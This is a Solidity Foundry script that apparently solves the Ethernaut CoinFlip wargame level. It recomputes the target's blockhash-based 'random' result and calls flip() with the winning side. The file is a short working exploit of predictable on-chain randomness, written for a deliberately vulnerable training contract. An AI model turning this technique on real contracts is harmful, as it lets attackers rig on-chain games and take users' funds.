pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/CoinFlip/CoinFlip.sol";
import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

contract CoinFlipScript is Script {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function run() public {
        address coinFlipAddress = vm.envAddress("COINFLIP_ADDRESS");
        CoinFlip ethernautCoinFlip = CoinFlip(coinFlipAddress);

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        ethernautCoinFlip.flip(side);

        console.log("Consecutive Wins: ", ethernautCoinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}